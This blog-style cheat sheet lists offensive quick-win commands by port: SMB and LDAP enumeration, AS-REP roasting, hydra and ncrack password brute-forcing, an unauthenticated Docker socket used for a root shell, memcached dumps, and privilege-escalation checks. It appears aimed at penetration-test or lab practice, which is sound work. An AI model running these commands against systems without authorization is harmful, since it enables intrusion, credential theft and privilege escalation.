---
layout: post
title: "Low Hanging Fruit"
date: 2025-06-30
categories: CheatSheets
---

## 🏰 Active Directory / Windows

| Port(s)     | **Why (low-hanging fruit)**                                                 | Quick-Win Commands                                                                         |
| ----------- | --------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------ |
| 445 / 139   | Null-session share dump & RID-brute: can leak usernames / passwords.        | `smbclient -L //$IP -N` `enum4linux-ng -A $IP` `rpcclient -U '' $IP -c enumdomusers`       |
| 389 / 636   | Anonymous LDAP bind may reveal users, OUs, even password policy.            | `ldapsearch -x -H ldap://$IP -s base` `windapsearch --dc-ip $IP -U users.txt`              |
| 88 / 464    | AS-REP roast: crackable Kerberos tickets without knowing a password.        | `GetNPUsers.py $DOMAIN/ -usersfile users.txt -no-pass -dc-ip $IP`                          |
| 5985 / 5986 | WinRM often allows PowerShell shells with domain creds—great foothold.      | `evil-winrm -i $IP -u $USER -p <pass/hash>` `crackmapexec winrm $IP -u $USER -p Password1` |
| 135         | RPC endpoint info can confirm DC role and expose attack surface (WMI/DCOM). | `rpcclient $IP -U '' -N -c 'srvinfo'`                                                      |

---

## 🌐 Web

| Port(s)                | **Why**                                                                           | Quick-Win Commands                                                                                                        |
| ---------------------- | --------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------- |
| 80 / 443 / 8080 / 8443 | Tech fingerprint + dir brute often exposes admin panels, backups, or RCE uploads. | `whatweb $IP` `ffuf -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt -u http://$IP/FUZZ -fc 404` `nikto -h $IP` |

---

## 🗃️ File-Transfer

| Port   | **Why**                                                                    | Quick-Win Commands                                                           |
| ------ | -------------------------------------------------------------------------- | ---------------------------------------------------------------------------- |
| 21     | Anonymous FTP can host config files / creds; writable dirs → shell upload. | `ftp $IP` (`anonymous:anonymous`) `nmap --script ftp-anon,ftp-syst $IP -p21` |
| 69/udp | TFTP rarely has auth—grab configs, firmwares, sometimes shadow files.      | `tftp $IP` → `get *`                                                         |
| 2049   | World-readable NFS exports let you read /root or push a set-uid shell.     | `showmount -e $IP` `sudo mount -t nfs $IP:/export /mnt`                      |
| 3306   | Blank-root or weak creds lead to file-write (INTO OUTFILE) ⇒ web-shell.    | `mysql -u root -h $IP -p''` `nmap --script mysql-empty-password $IP -p3306`  |

---

## 🔐 Remote Access

| Port | **Why**                                                              | Quick-Win Commands                                                         |
| ---- | -------------------------------------------------------------------- | -------------------------------------------------------------------------- |
| 22   | Weak passwords & obsolete ciphers still common; banner leaks distro. | `ssh -v $IP` `ssh-audit $IP` `hydra -L users.txt -P rockyou.txt ssh://$IP` |
| 23   | Legacy telnet boxes often keep default creds; banner gives OS.       | `telnet $IP` `hydra -L users.txt -P rockyou.txt telnet://$IP`              |
| 3389 | Mis-set RDP (NLA off) → BlueKeep or brute; weak domain creds reused. | `rdpscan $IP` `ncrack -U users.txt -P rockyou.txt rdp://$IP`               |

---

## ✉️ Mail

| Port(s)        | **Why**                                                    | Quick-Win Commands                                                                          |
| -------------- | ---------------------------------------------------------- | ------------------------------------------------------------------------------------------- |
| 25 / 465 / 587 | VRFY/EXPN leaks valid users; open relay = spam pivot.      | `nmap --script smtp-enum-users,smtp-open-relay $IP -p25` `swaks --to root@$IP --server $IP` |
| 110 / 143      | CAPA output sometimes exposes plaintext creds; easy brute. | `nmap --script pop3-capabilities,imap-capabilities $IP -p110,143`                           |

---

## 🛰️ Infrastructure

| Port    | **Why**                                                            | Quick-Win Commands                                                                  |                 |
| ------- | ------------------------------------------------------------------ | ----------------------------------------------------------------------------------- | --------------- |
| 53      | Zone-transfer can dump entire internal DNS in one shot.            | `dig axfr @$IP $DOMAIN` `dnsrecon -d $DOMAIN -t axfr`                               |                 |
| 161/udp | Default “public” community leaks hostnames, users, routes.         | `snmpwalk -v2c -c public $IP 1.3.6.1.2.1.1` `onesixtyone -c community.txt $IP`      |                 |
| 2375    | Docker socket unauth → pull/build containers = instant root shell. | `curl http://$IP:2375/containers/json` `docker -H tcp://$IP:2375 run -it alpine sh` |                 |
| 11211   | Exposed memcached lets you dump cached creds or website sessions.  | \`printf "stats\n"                                                                  | nc \$IP 11211\` |

---

## 🗡️ Post-Exploit One-Liners

| System  | **Why**                                                        | Command                                            |        |
| ------- | -------------------------------------------------------------- | -------------------------------------------------- | ------ |
| Linux   | Mis-configured sudoers is fastest privilege escalation.        | `sudo -l`                                          |        |
| Linux   | SUID binaries with write perms → privesc path.                 | \`find / -perm -4000 -type f 2>/dev/null           | head\` |
| Windows | Privileged tokens (SeImpersonate etc.) enable Potato exploits. | `whoami /priv`                                     |        |
| Windows | World-write ACLs on services allow binary overwrite → SYSTEM.  | `icacls "C:\Program Files" /findsid *S-1-5-32-544` |        |

---